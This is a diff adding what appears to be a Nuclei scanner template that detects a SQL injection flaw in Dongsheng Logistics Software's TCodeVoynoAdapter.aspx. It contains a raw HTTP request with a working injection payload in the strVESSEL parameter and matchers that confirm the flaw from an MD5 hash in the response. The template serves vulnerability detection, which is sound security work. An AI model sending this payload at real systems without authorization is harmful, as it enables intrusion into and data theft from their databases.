@@ -1,0 +1,32 @@
+id: dongshengwuliu-logistics-sqli
+
+info:
+  name: Dongsheng Logistics Software SQL Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Dongsheng Logistics Software TCodeVoynoAdapter.aspx has a SQL injection vulnerability, which can be exploited to obtain sensitive database information.
+    Successful exploitation may also allow attackers to escalate their privileges and gain unauthorized access to the system.
+  tags: 东胜物流软件
+  reference:
+    - http://www.dongshengsoft.com/
+
+http:
+  - raw:
+      - |
+        GET /FeeCodes/TCodeVoynoAdapter.aspx?mask=0&pos=0&strVESSEL=1%27%20and%20substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','1')),3,32)%3E0;-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "c4ca4238a0b923820dcc509a6f75849b"
+        part: body
